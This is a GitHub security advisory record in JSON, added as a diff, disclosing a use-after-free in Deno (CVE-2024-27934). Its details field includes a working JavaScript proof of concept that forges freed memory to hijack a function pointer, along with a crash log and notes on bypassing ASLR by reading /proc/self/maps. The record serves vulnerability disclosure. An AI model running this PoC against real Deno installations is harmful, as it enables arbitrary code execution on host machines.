@@ -1,0 +1,54 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-3j27-563v-28wf",
+  "modified": "2024-03-06T17:04:40Z",
+  "published": "2024-03-06T17:04:29Z",
+  "aliases": [
+    "CVE-2024-27934"
+  ],
+  "summary": "*const c_void / ExternalPointer unsoundness leading to use-after-free",
+  "details": "### Summary\n\nUse of inherently unsafe `*const c_void` and `ExternalPointer` leads to use-after-free access of the underlying structure, resulting in arbitrary code execution.\n\n\n### Details\n\n`*const c_void` and `ExternalPointer` (defined via `external!()` macros) types are used to represent `v8::External` wrapping arbitrary `void*` with an external lifetime. This is inherently unsafe as we are effectively eliding all Rust lifetime safety guarantees.\n\n`*const c_void` is trivially unsafe. `ExternalPointer` attempts to resolve this issue by wrapping the underlying pointer with a `usize`d marker ([`ExternalWithMarker<T>`](https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L49)).\n\nHowever, the marker [relies on the randomness of PIE address (binary base address)](https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L10) which is still trivially exploitable for a non-PIE binary. It is also equally exploitable on a PIE binary when an attacker is able to derandomize the PIE address. This is problematic as it escalates an information leak of the PIE address into an exploitable vulnerability.\n\nNote that an attacker able to control code executed inside the Deno runtime is very likely to be able to bypass ASLR with any means necessary (e.g. by chaining another vulnerability, or by using other granted permissions such as `--allow-read` to read `/proc/self/maps`).\n\n\n### PoC\n\nFor simplicity, we use Deno version 1.38.0 where streaming operations uses `*const c_void`. Testing environment is Docker image `denoland/deno:alpine-1.38.0@sha256:fe51a00f4fbbaf1e72b29667c3eeeda429160cef2342f22a92c3820020d41f38` although the exact versions shouldn't matter much if it's in 1.36.2 up to 1.38.0 (before `ExternalPointer` patch, refer Impact section for details)\n\n```js\nconst ops = Deno[Deno.internal].core.ops;\nconst rid = ops.op_readable_stream_resource_allocate();\nconst sink = ops.op_readable_stream_resource_get_sink(rid);\n\n// close\nops.op_readable_stream_resource_close(sink);\nops.op_readable_stream_resource_close(sink);\n\n// reclaim BoundedBufferChannelInner\nconst ab = new ArrayBuffer(0x8058);\nconst dv = new DataView(ab);\n\n// forge chunk contents\ndv.setBigUint64(0, 2n, true);\ndv.setBigUint64(0x8030, 0x1337c0d30000n, true);\n\n// trigger segfault\nDeno.close(rid);\n```\n\nBelow is the dmesg log after the crash. We see that Deno has segfaulted on `1337c0d30008`, which is +8 of what we have written at offset 0x8030. Note also that the dereferenced value will immediately be used as a function pointer, with the first argument dereferenced from offset 0x8038 - it is trivial to use this to build an end-to-end exploit.\n\n```text\n[ 6439.821046] deno[15088]: segfault at 1337c0d30008 ip 0000557b53e2fb3e sp 00007fffd485ac70 error 4 in deno[557b51714000+2d7f000] likely on CPU 12 (core 12, socket 0)\n[ 6439.821054] Code: 00 00 00 00 48 85 c0 74 03 ff 50 08 49 8b 86 30 80 00 00 49 8b be 38 80 00 00 49 c7 86 30 80 00 00 00 00 00 00 48 85 c0 74 03 <ff> 50 08 48 ff 03 48 83 c4 08 5b 41 5e c3 48 8d 3d 0d 1a 59 fb 48\n```\n\nThe same vulnerability exists for `ExternalPointer` implementation, but now it is required for the attacker to either leak the PIE address somehow, or else exploit unexpected aliasing behavior of `v8::External` values. The latter has not been investigated in depth, but it is theoretically possible to alias the same underlying pointer to different `v8::External` on different threads (Workers) and exploit the concurrency (`RefCell` may break this though).\n\n\n### Impact\n\nUse of inherently unsafe `*const c_void` and `ExternalPointer` leads to use-after-free access of the underlying structure, which is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.\n\nThis bug is **known to be exploitable** for both `*const c_void` and `ExternalPointer` implementations.\n\nAffected versions of Deno is from 1.36.2 up to latest.\n\n- [ext/web/stream_resource.rs](https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs):\n  - `*const c_void` introduced in 1.36.2\n  - Patched into `ExternalPointer` in 1.38.1\n- [ext/http/http_next.rs](https://github.com/denoland/deno/blob/main/ext/http/http_next.rs):\n  - `ExternalPointer` introduced in 1.38.2\n",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "deno"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.36.2"
+            },
+            {
+              "fixed": "1.40.3"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/denoland/deno"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-06T17:04:29Z",
+    "nvd_published_at": null
+  }
+}
